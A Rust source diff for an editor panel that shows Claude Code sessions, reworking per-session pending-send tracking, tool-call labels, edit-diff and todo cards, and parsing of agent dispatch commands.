-    fn resolve(&mut self, id: u64, outcome: &anyhow::Result<()>) {
-        if outcome.is_ok() {
-            return;
+    fn resolve(&mut self, id: u64, outcome: &anyhow::Result<String>) {
+        match outcome {
+            Ok(outbox_file) => {
+                if let Some(send) = self.sends.iter_mut().find(|send| send.id == id) {
+                    send.outbox_file = Some(outbox_file.clone());
+                }
+            }
+            Err(error) => {
+                if let Some(send) = self.sends.iter_mut().find(|send| send.id == id) {
+                    send.error = Some(SharedString::from(format!("Failed: {error:#}")));
+                }
+                self.evict_finished_over_bound();
+            }
         }
-        self.dismiss(id);
     }
 
-    /// Drops the messages sent to a session that is no longer the one being read.
-    fn retain_session(&mut self, selected_process_id: Option<u32>) {
+    fn retry(&mut self, id: u64, entries: &[Entry]) -> Option<SharedString> {
+        let messages = user_messages(entries);
+        let send = self.sends.iter_mut().find(|send| send.id == id)?;
+        send.preexisting_keys = messages
+            .iter()
+            .filter(|(_, source)| source.trim() == send.text.as_ref())
+            .map(|(key, _)| key.clone())
+            .collect();
+        send.newest_preexisting_key = messages.last().map(|(key, _)| key.clone());
+        send.outbox_file = None;
+        send.delivered_at_ms = None;
+        send.observed_at_ms = None;
+        send.error = None;
+        Some(send.text.clone())
+    }
+
+    fn text(&self, id: u64) -> Option<&SharedString> {
         self.sends
-            .retain(|send| Some(send.process_id) == selected_process_id);
+            .iter()
+            .find(|send| send.id == id)
+            .map(|send| &send.text)
+    }
+
+    /// Marks a send "delivered to Claude" when the inbox reports `message_sent` for the
+    /// outbox file the write returned. Tests pair against every row; production uses
+    /// [`Self::pair_with_channel_for`].
+    #[cfg(test)]
+    fn pair_with_channel(&mut self, events: &[ChannelInboxEvent], now_ms: i64) {
+        self.deliver_channel_events(events, now_ms, None);
+    }
+
+    /// The same, considering only rows sent to `session_id`.
+    fn pair_with_channel_for(
+        &mut self,
+        events: &[ChannelInboxEvent],
+        now_ms: i64,
+        session_id: &str,
+    ) {
+        self.deliver_channel_events(events, now_ms, Some(session_id));
+    }
+
+    fn deliver_channel_events(
+        &mut self,
+        events: &[ChannelInboxEvent],
+        now_ms: i64,
+        only_session: Option<&str>,
+    ) {
+        if self.is_empty() {
+            return;
+        }
+        for event in events {
+            let ChannelInboxEvent::MessageSent {
+                outbox_file, at_ms, ..
+            } = event
+            else {
+                continue;
+            };
+            for send in &mut self.sends {
+                if only_session.is_some_and(|session_id| send.session_id != session_id) {
+                    continue;
+                }
+                if send.error.is_none()
+                    && send.delivered_at_ms.is_none()
+                    && send.outbox_file.as_deref() == Some(outbox_file.as_str())
+                {
+                    send.delivered_at_ms = Some(*at_ms);
+                    send.observed_at_ms = Some(now_ms);
+                }
+            }
+        }
+        self.evict_finished_over_bound();
+    }
+
+    /// Rewrites rows of `old_session_id` so they belong to `new_session_id`, which is
+    /// what `/clear` does: same conversation, new id.
+    fn rebind(&mut self, old_session_id: &str, new_session_id: &str) {
+        for send in &mut self.sends {
+            if send.session_id == old_session_id {
+                send.session_id = new_session_id.to_string();
+            }
+        }
     }
 
     /// Takes down the messages whose records have turned up in `entries`.
@@ -5579,7 +8276,17 @@ impl PendingSends {
     /// and by order: the oldest send that is still waiting takes the oldest record it
     /// could be, which is what makes two sends of the same text come down as their two
     /// records arrive rather than both at the first one.
+    #[cfg(test)]
     fn pair_with(&mut self, entries: &[Entry]) {
+        self.pair_sends(entries, None);
+    }
+
+    /// The same, considering only rows sent to `session_id`.
+    fn pair_with_session(&mut self, entries: &[Entry], session_id: &str) {
+        self.pair_sends(entries, Some(session_id));
+    }
+
+    fn pair_sends(&mut self, entries: &[Entry], only_session: Option<&str>) {
         // Walking the conversation for arrivals costs the length of the transcript, and
         // there is nothing waiting for them the overwhelming majority of the time.
         if self.is_empty() {
@@ -5591,6 +8298,12 @@ impl PendingSends {
         let mut paired: HashSet<u64> = HashSet::default();
 
         for send in &self.sends {
+            if only_session.is_some_and(|session_id| send.session_id != session_id) {
+                continue;
+            }
+            if send.error.is_some() {
+                continue;
+            }
             // Only the records written after the conversation the send was measured
             // against are candidates. Without this, a conversation that shows more of
             // itself than the send was measured against — the history behind a
@@ -5631,13 +8344,36 @@ impl PendingSends {
 
     /// Whether one of these is the same message as `text`, which is how a queue entry
     /// read from the log is recognised as one of these rather than a second message.
-    fn holds_text(&self, text: &str) -> bool {
-        self.sends.iter().any(|send| send.text == text)
+    /// Only rows of `session_id` count: another session's pending send is not this
+    /// conversation's queue entry.
+    fn holds_text(&self, text: &str, session_id: Option<&str>) -> bool {
+        // The queue log holds the line the CLI was handed, and a message sent from Zed is
+        // handed over wrapped in its `<channel …>` envelope. A send knows only the words
+        // the reader typed, so the unwrapped form has to be recognised too — otherwise
+        // the one message is drawn twice, as a queue row beside its own pending row.
+        let unwrapped = queued_message_body(text);
+        self.sends.iter().any(|send| {
+            Some(send.session_id.as_str()) == session_id
+                && (send.text == text || send.text == unwrapped.as_str())
+        })
     }
 
+    #[cfg(test)]
     fn entries(&self) -> Vec<Entry> {
+        self.entries_matching(|_| true)
+    }
+
+    /// What the conversation draws for `selected`: rows of that session, or nothing
+    /// while none is selected. The backing collection is not filtered.
+    fn entries_for(&self, selected: Option<&str>) -> Vec<Entry> {
+        self.entries_matching(|send| Some(send.session_id.as_str()) == selected)
+    }
+
+    fn entries_matching(&self, belongs: impl Fn(&PendingSend) -> bool) -> Vec<Entry> {
+        let now_ms = now_millis();
         self.sends
             .iter()
+            .filter(|send| belongs(send))
             .map(|send| Entry {
                 // Keyed outside the transcript's namespace: a record is keyed by its
                 // uuid, and nothing derived from a pending message may be cached under
@@ -5646,6 +8382,8 @@ impl PendingSends {
                 kind: EntryKind::Pending {
                     id: send.id,
                     text: send.text.clone(),
+                    note: pending_send_note(send, now_ms),
+                    failed: send.error.is_some(),
                 },
             })
             .collect()
@@ -5653,6 +8391,60 @@ impl PendingSends {
 
     fn is_empty(&self) -> bool {
         self.sends.is_empty()
+    }
+
+    fn has_row_for(&self, session_id: Option<&str>) -> bool {
+        let Some(session_id) = session_id else {
+            return false;
+        };
+        self.sends.iter().any(|send| send.session_id == session_id)
+    }
+
+    fn send_is_finished(send: &PendingSend) -> bool {
+        send.error.is_some() || send.delivered_at_ms.is_some()
+    }
+
+    /// Marks in-flight rows whose session is neither live nor ended as failed, so the
+    /// finished bound can cover them. Finished rows, and rows of a session that is still
+    /// listed, are left alone.
+    fn fail_in_flight_of_unknown_sessions<'a>(
+        &mut self,
+        known_session_ids: impl IntoIterator<Item = &'a str>,
+    ) {
+        let known_session_ids: HashSet<&str> = known_session_ids.into_iter().collect();
+        for send in &mut self.sends {
+            if Self::send_is_finished(send) {
+                continue;
+            }
+            if !known_session_ids.contains(send.session_id.as_str()) {
+                send.error = Some(SharedString::from(SESSION_ENDED_BEFORE_ARRIVAL));
+            }
+        }
+    }
+
+    /// Drops the oldest delivered-or-failed rows until at most
+    /// [`FINISHED_PENDING_SEND_BOUND`] finished rows remain. In-flight rows are not
+    /// counted and are never chosen.
+    fn evict_finished_over_bound(&mut self) {
+        let finished = self
+            .sends
+            .iter()
+            .filter(|send| Self::send_is_finished(send))
+            .count();
+        let Some(overflow) = finished.checked_sub(FINISHED_PENDING_SEND_BOUND) else {
+            return;
+        };
+        if overflow == 0 {
+            return;
+        }
+        let mut remaining_to_drop = overflow;
+        self.sends.retain(|send| {
+            if remaining_to_drop == 0 || !Self::send_is_finished(send) {
+                return true;
+            }
+            remaining_to_drop -= 1;
+            false
+        });
     }
 }
 
@@ -5671,6 +8463,39 @@ fn user_messages(entries: &[Entry]) -> Vec<(SharedString, SharedString)> {
             // `/compact` turns into.
             EntryKind::SlashCommand { text } => Some((entry.key.clone(), text.clone())),
             _ => None,
+        })
+        .collect()
+}
+
+/// The messages the CLI is holding behind the turn it is running, read from the queue
+/// log, as rows of the conversation.
+///
+/// A message sent from Zed is in that queue as well, and is already drawn as a pending
+/// send — the one the panel can take back when the send fails — so the queue entry
+/// matching it is left to that.
+fn queued_entries<'queue>(
+    queued: impl IntoIterator<Item = &'queue SharedString>,
+    pending_sends: &PendingSends,
+    selected: Option<&str>,
+) -> Vec<Entry> {
+    queued
+        .into_iter()
+        .filter(|text| !pending_sends.holds_text(text, selected))
+        // A background task reporting in is queued exactly as a message typed mid-turn
+        // is, and its text is nothing but the block the CLI wrote to tell itself. Held to
+        // the same rule as the conversation's own records — what is left once the
+        // injected blocks are cut — so a notification is dropped and typed words, which
+        // are never one of those blocks, are kept whole.
+        .filter_map(|text| user_visible_text(text))
+        .map(|text| queued_message_body(&text))
+        .map(|text| Entry {
+            // Keyed on the text: the queue log gives these no id of their own, and the
+            // key has to be the same across rebuilds or the list remeasures an item that
+            // did not change.
+            key: SharedString::from(format!("queued-{text}")),
+            kind: EntryKind::Queued {
+                text: SharedString::from(text),
+            },
         })
         .collect()
 }
@@ -5890,34 +8715,504 @@ fn tool_result_ids(record: &TranscriptRecord) -> Vec<&str> {
 
 /// The words drawn beside a running tool's name to say which call it is.
 ///
-/// Empty for a tool with no rule of its own: the inputs are the tool's business, and
-/// reaching into an unknown one for something that looks like a target would put a
-/// misleading line above the input. Naming the tool alone is honest and still useful.
+/// First string among `file_path`, `path`, `pattern`, `url`, `query`, `command`,
+/// `description`, `skill`, then `prompt` (first line), then the first string-valued
+/// top-level input field. Never JSON.
 fn tool_target(block: &Value) -> SharedString {
+    tool_target_from_input(block.get("input"))
+}
+
+fn tool_target_from_input(input: Option<&Value>) -> SharedString {
     let argument = |key: &str| {
-        block
-            .get("input")
+        input
             .and_then(|input| input.get(key))
             .and_then(Value::as_str)
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
     };
 
-    let target = match block
-        .get("name")
-        .and_then(Value::as_str)
-        .unwrap_or_default()
+    const PREFERRED: [&str; 8] = [
+        "file_path",
+        "path",
+        "pattern",
+        "url",
+        "query",
+        "command",
+        "description",
+        "skill",
+    ];
+
+    if let Some(target) = PREFERRED.iter().find_map(|key| argument(key)) {
+        return SharedString::from(truncate_and_trailoff(target, TOOL_TARGET_CHARACTERS));
+    }
+
+    if let Some(prompt) = argument("prompt") {
+        let line = prompt
+            .lines()
+            .find(|line| !line.trim().is_empty())
+            .unwrap_or("");
+        return SharedString::from(truncate_and_trailoff(
+            line.trim(),
+            TOOL_TARGET_PROMPT_CHARACTERS,
+        ));
+    }
+
+    if let Some(object) = input.and_then(Value::as_object) {
+        for value in object.values() {
+            if let Some(text) = value
+                .as_str()
+                .map(str::trim)
+                .filter(|text| !text.is_empty())
+            {
+                return SharedString::from(truncate_and_trailoff(text, TOOL_TARGET_CHARACTERS));
+            }
+        }
+    }
+
+    SharedString::from("")
+}
+
+/// Whether a path a session said it sent may be handed to the machine's own opener.
+///
+/// The path is a string from the transcript, and opening one runs whatever the OS has
+/// registered for it, so it is held to the boundary the panel already reads attachments
+/// under rather than to nothing at all.
+fn sent_path_is_openable(path: &Path, working_directory: &Path) -> bool {
+    attachment_is_readable(path, working_directory)
+}
+
+fn mcp_tool_parts(name: &str) -> Option<(&str, &str)> {
+    let rest = name.strip_prefix("mcp__")?;
+    let (server, tool) = rest.split_once("__")?;
+    if server.is_empty() || tool.is_empty() {
+        return None;
+    }
+    Some((server, tool))
+}
+
+fn edit_diff_text(old: &str, new: &str) -> String {
+    let diff = similar::TextDiff::from_lines(old, new);
+    let mut output = String::new();
+    for change in diff.iter_all_changes() {
+        let sign = match change.tag() {
+            similar::ChangeTag::Delete => '-',
+            similar::ChangeTag::Insert => '+',
+            similar::ChangeTag::Equal => ' ',
+        };
+        output.push(sign);
+        output.push_str(change.value().trim_end_matches('\n'));
+        output.push('\n');
+    }
+    output
+}
+
+/// The diff an `Edit` card draws, or `None` when the call's result carries the patch
+/// that was really applied. One call is drawn with one diff: the patch is what the edit
+/// did, the input diff is what it was asked to do, and showing both says the same change
+/// twice in two shapes.
+fn edit_card_diff<'diff>(
+    diff: Option<&'diff SharedString>,
+    id: Option<&SharedString>,
+    patched_calls: &HashSet<SharedString>,
+) -> Option<&'diff SharedString> {
+    if id.is_some_and(|id| patched_calls.contains(id)) {
+        return None;
+    }
+    diff
+}
+
+/// The ids of the calls whose results carry a `structuredPatch`.
+fn calls_answered_with_a_patch(path: &[&TranscriptRecord]) -> HashSet<SharedString> {
+    let mut answered = HashSet::default();
+    for record in path {
+        if structured_patch_text(record.raw.get("toolUseResult")).is_none() {
+            continue;
+        }
+        let Some(blocks) = record
+            .raw
+            .get("message")
+            .and_then(|message| message.get("content"))
+            .and_then(Value::as_array)
+        else {
+            continue;
+        };
+        for block in blocks {
+            if block.get("type").and_then(Value::as_str) != Some(TOOL_RESULT_BLOCK_TYPE) {
+                continue;
+            }
+            if let Some(id) = block.get("tool_use_id").and_then(Value::as_str) {
+                answered.insert(SharedString::from(id.to_string()));
+            }
+        }
+    }
+    answered
+}
+
+fn edit_input_diff(input: &Value) -> Option<String> {
+    let old = input.get("old_string").and_then(Value::as_str);
+    let new = input.get("new_string").and_then(Value::as_str);
+    if old.is_none() && new.is_none() {
+        return None;
+    }
+    let old = old.unwrap_or("");
+    let new = new.unwrap_or("");
+    // A line diff is quadratic in the worst case and an `Edit` carries whatever the
+    // model wrote, so past this much text the card says what it replaced instead. The
+    // result's `structuredPatch`, when there is one, is already the whole answer.
+    if old.len().saturating_add(new.len()) > MAX_EDIT_DIFF_BYTES {
+        return Some(format!(
+            "{} replaced by {} — too large to diff here",
+            describe_byte_count(old.len() as u64),
+            describe_byte_count(new.len() as u64)
+        ));
+    }
+    Some(edit_diff_text(old, new))
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum TodoStatus {
+    Pending,
+    InProgress,
+    Completed,
+}
+
+struct TodoItem {
+    content: SharedString,
+    status: TodoStatus,
+}
+
+fn parse_todos(input: &Value) -> Option<Vec<TodoItem>> {
+    let todos = input.get("todos")?.as_array()?;
+    let mut items = Vec::new();
+    for todo in todos {
+        let content = todo
+            .get("content")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .trim();
+        let status = match todo.get("status").and_then(Value::as_str) {
+            Some("pending") => TodoStatus::Pending,
+            Some("in_progress") => TodoStatus::InProgress,
+            Some("completed") => TodoStatus::Completed,
+            _ => return None,
+        };
+        items.push(TodoItem {
+            content: SharedString::from(content.to_string()),
+            status,
+        });
+    }
+    Some(items)
+}
+
+/// The one line a collapsed TodoWrite card is read from: how much of the list is done,
+/// and what the session is on right now.
+fn todo_summary(todos: &[TodoItem]) -> SharedString {
+    let done = todos
+        .iter()
+        .filter(|todo| todo.status == TodoStatus::Completed)
+        .count();
+    let summary = format!("Todo · {done}/{} done", todos.len());
+    match todos
+        .iter()
+        .find(|todo| todo.status == TodoStatus::InProgress)
+        .map(|todo| todo.content.trim())
+        .filter(|content| !content.is_empty())
     {
-        // The file is what says which read or write this is; the directory it sits in
-        // is the same for most of them and does not fit on the line.
-        "Read" | "Write" | "Edit" | "NotebookEdit" => argument("file_path")
-            .and_then(|path| Path::new(path).file_name())
-            .and_then(|name| name.to_str())
-            .unwrap_or_default(),
-        // Often a whole pipeline, of which the head is what names the call.
-        "Bash" => argument("command").unwrap_or_default(),
-        _ => "",
-    };
+        Some(running) => SharedString::from(format!(
+            "{summary} · {}",
+            truncate_and_trailoff(running, TOOL_TARGET_CHARACTERS)
+        )),
+        None => SharedString::from(summary),
+    }
+}
 
-    SharedString::from(truncate_and_trailoff(target.trim(), TOOL_TARGET_CHARACTERS))
+struct AskedQuestion {
+    header: SharedString,
+    question: SharedString,
+    options: Vec<SharedString>,
+}
+
+fn parse_asked_questions(input: &Value) -> Option<Vec<AskedQuestion>> {
+    let questions = input.get("questions")?.as_array()?;
+    let mut asked = Vec::new();
+    for question in questions {
+        let header = question
+            .get("header")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .trim();
+        let text = question
+            .get("question")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .trim();
+        let options = question
+            .get("options")
+            .and_then(Value::as_array)
+            .map(|options| {
+                options
+                    .iter()
+                    .filter_map(|option| {
+                        option
+                            .get("label")
+                            .and_then(Value::as_str)
+                            .map(str::trim)
+                            .filter(|label| !label.is_empty())
+                            .map(|label| SharedString::from(label.to_string()))
+                    })
+                    .collect()
+            })
+            .unwrap_or_default();
+        asked.push(AskedQuestion {
+            header: SharedString::from(header.to_string()),
+            question: SharedString::from(text.to_string()),
+            options,
+        });
+    }
+    Some(asked)
+}
+
+fn ask_user_answer_text(body: &ToolResultBody) -> Option<SharedString> {
+    let text = match body {
+        ToolResultBody::Inline(text) => text.as_ref(),
+        ToolResultBody::Persisted(persisted) => persisted.preview.as_ref(),
+    };
+    let trimmed = text.trim();
+    if trimmed.is_empty() {
+        return None;
+    }
+    Some(pretty_ask_user_answers(trimmed))
+}
+
+fn pretty_ask_user_answers(text: &str) -> SharedString {
+    let Ok(value) = serde_json::from_str::<Value>(text) else {
+        return SharedString::from(text.to_string());
+    };
+    let mut lines = Vec::new();
+    if let Some(answers) = value.get("answers").and_then(Value::as_array) {
+        for answer in answers {
+            if let Some(line) = ask_user_answer_line(answer) {
+                lines.push(line);
+            }
+        }
+    } else if let Some(line) = ask_user_answer_line(&value) {
+        lines.push(line);
+    }
+    if lines.is_empty() {
+        SharedString::from(text.to_string())
+    } else {
+        SharedString::from(lines.join("\n"))
+    }
+}
+
+fn ask_user_answer_line(value: &Value) -> Option<String> {
+    value
+        .as_str()
+        .map(str::to_string)
+        .or_else(|| {
+            value
+                .get("label")
+                .and_then(Value::as_str)
+                .map(str::to_string)
+        })
+        .or_else(|| {
+            value
+                .get("text")
+                .and_then(Value::as_str)
+                .map(str::to_string)
+        })
+        .map(|line| line.trim().to_string())
+        .filter(|line| !line.is_empty())
+}
+
+struct CliDispatch {
+    model: Option<SharedString>,
+    prompt_path: Option<PathBuf>,
+    log_path: Option<PathBuf>,
+}
+
+/// One word of a shell command, with the quotes that grouped it removed.
+///
+/// `quoted` is what keeps the parsing below out of the prompt: every interesting piece of
+/// a dispatch — the program, its flags, the redirect — is written unquoted, while the
+/// prompt handed to the agent is the one part that is quoted and may hold anything,
+/// including the words `--model` and `>`.
+struct CommandWord {
+    text: String,
+    quoted: bool,
+}
+
+/// Splits a command into its words the way a shell would for this purpose: on unquoted
+/// whitespace, honouring single and double quotes. Nothing is expanded; `$(cat …)` stays
+/// one word because the quotes around it say so.
+fn command_words(command: &str) -> Vec<CommandWord> {
+    let mut words = Vec::new();
+    let mut text = String::new();
+    let mut started = false;
+    let mut quoted = false;
+    let mut inside: Option<char> = None;
+
+    for character in command.chars() {
+        match inside {
+            Some(quote) if character == quote => inside = None,
+            Some(_) => text.push(character),
+            None if character == '"' || character == '\'' => {
+                inside = Some(character);
+                started = true;
+                quoted = true;
+            }
+            None if character.is_whitespace() => {
+                if started {
+                    words.push(CommandWord {
+                        text: std::mem::take(&mut text),
+                        quoted,
+                    });
+                    started = false;
+                    quoted = false;
+                }
+            }
+            None => {
+                text.push(character);
+                started = true;
+            }
+        }
+    }
+    if started {
+        words.push(CommandWord { text, quoted });
+    }
+    words
+}
+
+/// Whether one of the words names a program, allowing for the absolute paths these are
+/// usually written with.
+fn word_is_program(word: &CommandWord, program: &str) -> bool {
+    !word.quoted && (word.text == program || word.text.ends_with(&format!("/{program}")))
+}
+
+fn parse_cli_dispatch(command: &str) -> Option<CliDispatch> {
+    let words = command_words(command);
+    let dispatches = words.iter().enumerate().any(|(index, word)| {
+        let next = words
+            .get(index.saturating_add(1))
+            .map(|word| word.text.as_str());
+        (word_is_program(word, "agent") && next == Some("-f"))
+            || word_is_program(word, "agy")
+            || (word_is_program(word, "codex") && next == Some("exec"))
+    });
+    if !dispatches {
+        return None;
+    }
+    Some(CliDispatch {
+        model: dispatch_flag_value(&words, "--model")
+            .or_else(|| dispatch_flag_value(&words, "-m"))
+            .map(SharedString::from),
+        prompt_path: dispatch_prompt_path(command, &words),
+        log_path: dispatch_redirect_path(&words),
+    })
+}
+
+/// The value written for `flag`, which has to be a word of its own — the `-m` inside
+/// `--max-old-space-size=512` names no model — and outside the prompt.
+fn dispatch_flag_value(words: &[CommandWord], flag: &str) -> Option<String> {
+    let with_equals = format!("{flag}=");
+    words.iter().enumerate().find_map(|(index, word)| {
+        if word.quoted {
+            return None;
+        }
+        if let Some(value) = word.text.strip_prefix(&with_equals) {
+            return (!value.is_empty()).then(|| value.to_string());
+        }
+        if word.text != flag {
+            return None;
+        }
+        words
+            .get(index.saturating_add(1))
+            .map(|value| value.text.clone())
+            .filter(|value| !value.is_empty())
+    })
+}
+
+fn dispatch_prompt_path(command: &str, words: &[CommandWord]) -> Option<PathBuf> {
+    if let Some(rest) = command.split_once("$(cat ").map(|(_, rest)| rest) {
+        let end = rest.find(')')?;
+        let path = rest.get(..end)?.trim().trim_matches('"').trim_matches('\'');
+        if !path.is_empty() {
+            return Some(PathBuf::from(path));
+        }
+    }
+    dispatch_flag_value(words, "-p")
+        .filter(|value| !value.starts_with('$') && value.contains('/'))
+        .map(PathBuf::from)
+}
+
+/// Where the command's own output was redirected. The last unquoted `>` wins, because a
+/// command may redirect more than once; a `>` inside the prompt is not a redirect at all.
+fn dispatch_redirect_path(words: &[CommandWord]) -> Option<PathBuf> {
+    let path = words.iter().enumerate().rev().find_map(|(index, word)| {
+        if word.quoted {
+            return None;
+        }
+        if word.text.starts_with('>') {
+            let path = word.text.trim_start_matches('>').trim();
+            if !path.is_empty() {
+                return Some(path.to_string());
+            }
+            return words
+                .get(index.saturating_add(1))
+                .filter(|next| !next.quoted)
+                .map(|next| next.text.clone());
+        }
+        None
+    })?;
+    (!path.is_empty()).then(|| PathBuf::from(path))
+}
+
+fn report_path_in_prompt(text: &str) -> Option<PathBuf> {
+    if let Some(rest) = text.split_once("Report file:") {
+        let path = rest.1.lines().next().unwrap_or("").trim();
+        if !path.is_empty() {
+            return Some(PathBuf::from(path));
+        }
+    }
+    for word in text.split_whitespace() {
+        if word.ends_with(".md") && (word.contains("report") || word.contains('/')) {
+            return Some(PathBuf::from(
+                word.trim_matches(|c| c == '`' || c == '"' || c == '\''),
+            ));
+        }
+    }
+    None
+}
+
+fn format_turn_footer(
+    duration_ms: u64,
+    message_count: u64,
+    pending_background_agents: u64,
+) -> String {
+    let total_seconds = duration_ms / 1000;
+    let minutes = total_seconds / 60;
+    let seconds = total_seconds % 60;
+    let duration = if minutes == 0 {
+        format!("{seconds}s")
+    } else {
+        format!("{minutes}m {seconds}s")
+    };
+    let messages = if message_count == 1 {
+        "1 message".to_string()
+    } else {
+        format!("{message_count} messages")
+    };
+    if pending_background_agents == 0 {
+        format!("{duration} · {messages}")
+    } else if pending_background_agents == 1 {
+        format!("{duration} · {messages} · 1 agent still running")
+    } else {
+        format!("{duration} · {messages} · {pending_background_agents} agents still running")
+    }
+}
+
+fn parse_tool_input(input: &str) -> Option<Value> {
+    serde_json::from_str(input).ok()
 }
 
 /// Whether one of the selected session's agents is still working.
@@ -6005,188 +9300,18 @@ fn scroll_tracking_list_state(cx: &mut Context<ClaudeSessionsPanel>) -> ListStat
     list_state
 }
 
-/// Which question of a call the terminal is asking now.
+/// Whether the conversation holds the `tool_result` answering `tool_use_id`.
 ///
-/// A call carrying several questions is asked one at a time, and the terminal names them
-/// in a strip along the top with the answered ones ticked. Counting the ticks is the only
-/// thing read out of that strip: the reader is being asked the first one that is not.
-///
-/// A call with one question draws no strip, and a terminal that cannot be read leaves the
-/// reader on the first question, which is where a call starts.
-/// Which of a call's questions the pane is showing.
-///
-/// The strip of marks along the top counts what has been answered, but it scrolls — the
-/// arrows it is drawn between are the terminal saying so. On a narrow window only some
-/// of the questions fit and the marks for the rest are not drawn at all, so counting
-/// them reads the wrong question and the reader is shown the options of one they
-/// answered several questions ago.
-///
-/// The question's own text is on screen whatever the window is doing, so it is what the
-/// index is read from. The marks are the fallback for a pane that does not carry the
-/// text — one scrolled past it, or a question drawn too narrow to hold it.
-fn question_being_asked(pane: Option<&str>, questions: &[Question]) -> usize {
-    let Some(pane) = pane else {
-        return 0;
-    };
-
-    question_named_on_screen(pane, questions).unwrap_or_else(|| questions_marked_answered(pane))
-}
-
-/// The question whose text is drawn lowest on the screen.
-///
-/// Lowest rather than first: the pane holds the questions already answered above the one
-/// being asked, and the newest of anything in a terminal is at the bottom.
-fn question_named_on_screen(pane: &str, questions: &[Question]) -> Option<usize> {
-    // Compared without any of the whitespace, because the terminal wraps a question to
-    // the window's width — and wraps text with no spaces in it, which is most of the
-    // questions this panel is read with, by breaking mid-sentence.
-    let screen = without_whitespace(pane);
-
-    questions
+/// Read down the whole conversation rather than along the path the model can still
+/// see. Compaction deliberately severs that chain, so a call answered before one
+/// would read as unanswered against the active path for the rest of the session.
+#[cfg(test)]
+fn call_is_answered(transcript: &crate::Transcript, tool_use_id: &str) -> bool {
+    transcript
+        .full_path()
         .iter()
-        .enumerate()
-        .filter_map(|(index, question)| {
-            let asked = without_whitespace(&question.question);
-            if asked.is_empty() {
-                return None;
-            }
-            let start = screen.rfind(&asked)?;
-            let end = start.checked_add(asked.len())?;
-            Some((end, asked.len(), index))
-        })
-        .max()
-        .map(|(_, _, index)| index)
+        .any(|record| tool_result_ids(record).contains(&tool_use_id))
 }
-
-fn without_whitespace(text: &str) -> String {
-    text.chars()
-        .filter(|character| !character.is_whitespace())
-        .collect()
-}
-
-fn questions_marked_answered(pane: &str) -> usize {
-    pane.lines()
-        .rev()
-        .find(|line| line.contains(QUESTION_ANSWERED_MARK) || line.contains(QUESTION_PENDING_MARK))
-        .map(|strip| strip.matches(QUESTION_ANSWERED_MARK).count())
-        .unwrap_or(0)
-}
-
-/// The screen Claude Code draws once the last question of a call has been answered: the
-/// answers listed back, and a choice between sending them and starting again.
-///
-/// The call is still waiting at this point — the tool has returned nothing — so a panel
-/// that only knows about questions draws the last one over a screen it no longer
-/// describes, and the one thing the terminal is waiting for has no button at all.
-const REVIEW_PROMPT: &str = "Ready to submit your answers?";
-const REVIEW_SUBMIT_ROW: &str = "Submit answers";
-const REVIEW_CANCEL_ROW: &str = "Cancel";
-
-/// Whether the pane is showing that screen.
-///
-/// Both the question and the rows it offers are required: the words alone turn up in
-/// what a session says, and the prompt without its rows is a screen caught half-drawn.
-/// `capture-pane` reads the visible screen rather than the scrollback, so what is found
-/// here is what the terminal is showing now.
-fn answers_awaiting_confirmation(pane: &str) -> bool {
-    let Some(after_prompt) = pane.rfind(REVIEW_PROMPT).map(|at| &pane[at..]) else {
-        return false;
-    };
-    after_prompt.contains(REVIEW_SUBMIT_ROW) && after_prompt.contains(REVIEW_CANCEL_ROW)
-}
-
-/// The keys that answer that screen. Its rows are numbered, and a numbered menu takes
-/// the digit as the whole answer.
-fn keys_for_confirmation(send: bool) -> Option<Vec<PaneKey>> {
-    keys_for_single_choice(if send { 0 } else { 1 })
-}
-
-/// The marks the terminal puts beside each question in its strip: answered, and not.
-const QUESTION_ANSWERED_MARK: &str = "☒";
-const QUESTION_PENDING_MARK: &str = "☐";
-
-/// The keys that answer a question by picking one option outright.
-///
-/// A numbered menu takes the digit as the whole answer, which is why a single-answer
-/// question costs one keypress and needs to know nothing about where the cursor is.
-fn keys_for_single_choice(option_index: usize) -> Option<Vec<PaneKey>> {
-    Some(vec![PaneKey::Choice(Digit::for_option(option_index)?)])
-}
-
-/// The keys that take the reader to typing their own answer.
-///
-/// `Type something` is drawn as one more row after the options the model gave, and is
-/// numbered along with them. In a menu taking one answer its digit is the whole answer
-/// and the box opens at once; in a menu taking several the digit only ticks the row, so
-/// the answer has to be submitted like any other, carrying whatever else was ticked.
-fn keys_for_own_words(
-    ticked: &HashSet<usize>,
-    option_count: usize,
-    several: bool,
-) -> Option<Vec<PaneKey>> {
-    if !several {
-        return keys_for_single_choice(option_count);
-    }
-
-    let mut with_own_words = ticked.clone();
-    with_own_words.insert(option_count);
-    keys_for_several_choices(&with_own_words, option_count)
-}
-
-/// The rows Claude Code draws below the options of a question taking several answers:
-/// `Type something`, `Submit`, and `Chat about this`.
-const ROWS_BELOW_THE_OPTIONS: usize = 3;
-
-/// The keys that answer a question taking several options.
-///
-/// Each tick is that option's digit, which toggles it. Unlike the menu for a question
-/// taking one answer, the digit does **not** move the cursor, so where the cursor stands
-/// when the ticks are done is not knowable from the ticks — counting the walk to
-/// `Submit` from the last ticked option lands `Enter` on whichever row it reaches,
-/// ticking an option the reader never chose or opening `Type something`.
-///
-/// So the walk does not count from anywhere. Down stops on the last row rather than
-/// wrapping, so walking further than the menu is tall puts the cursor on `Chat about
-/// this` from wherever it was, and `Submit` is the row above it.
-fn keys_for_several_choices(ticked: &HashSet<usize>, option_count: usize) -> Option<Vec<PaneKey>> {
-    if ticked.is_empty() {
-        return None;
-    }
-
-    // Sorted only so that the keys are the same sequence for the same answer, which is
-    // what makes them worth reading in a test or a log.
-    let mut ticks: Vec<usize> = ticked.iter().copied().collect();
-    ticks.sort_unstable();
-
-    let mut keys = Vec::new();
-    for option_index in ticks {
-        keys.push(PaneKey::Choice(Digit::for_option(option_index)?));
-    }
-
-    for _ in 0..option_count + ROWS_BELOW_THE_OPTIONS {
-        keys.push(PaneKey::Down);
-    }
-    keys.push(PaneKey::Up);
-    keys.push(PaneKey::Enter);
-    Some(keys)
-}
-
-/// The answer being filled in for one question that takes several options.
-struct TickedAnswer {
-    /// The call and the question within it these ticks are for. A question replaced by
-    /// the next one of the same call must not inherit them, and neither must a question
-    /// of another call entirely.
-    tool_use_id: SharedString,
-    question_index: usize,
-    ticked: HashSet<usize>,
-}
-
-/// How long to leave between the keys of one answer.
-///
-/// The terminal redraws its menu between keypresses and reads the next key against what
-/// it has drawn, so keys sent faster than it redraws are answered against the wrong
-/// menu. This is the cost of answering through a terminal rather than an API.
